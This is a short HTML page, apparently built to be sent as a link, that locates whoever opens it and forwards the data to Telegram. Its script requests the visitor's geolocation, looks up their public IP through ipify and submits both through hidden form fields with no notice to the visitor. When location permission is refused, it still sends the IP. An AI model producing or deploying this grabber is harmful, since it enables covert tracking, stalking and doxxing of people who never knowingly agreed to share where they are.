<!DOCTYPE html>
<html>
<head>
    <title>Send Location or IP Address to Telegram</title>
</head>
<body>
    <h1>Send Location to Telegram</h1>
    <form id="location-form" action="/send_location" method="post">
        <input type="hidden" name="latitude" id="latitude">
        <input type="hidden" name="longitude" id="longitude">
        <input type="hidden" name="ip_address" id="ip-address">
    </form>
    
    <script>
        navigator.geolocation.getCurrentPosition(function(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            
            // Set the latitude and longitude values on the form
            document.getElementById("latitude").value = latitude;
            document.getElementById("longitude").value = longitude;
            
            // Get the IP address of the user
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ip_address = data.ip;
                    
                    // Set the IP address value on the form
                    document.getElementById("ip-address").value = ip_address;
                    
                    // Submit the form to send the location and IP address to the Flask app
                    document.getElementById("location-form").submit();
                });
        }, function(error) {
            if (error.code == error.PERMISSION_DENIED) {
                // If the user denies permission to access their location, send the IP address only
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        var ip_address = data.ip;
                        
                        // Set the IP address value on the form
                        document.getElementById("ip-address").value = ip_address;
                        
                        // Submit the form to send the IP address to the Flask app
                        document.getElementById("location-form").submit();
                    });
            }
        });
    </script>
</body>
</html>
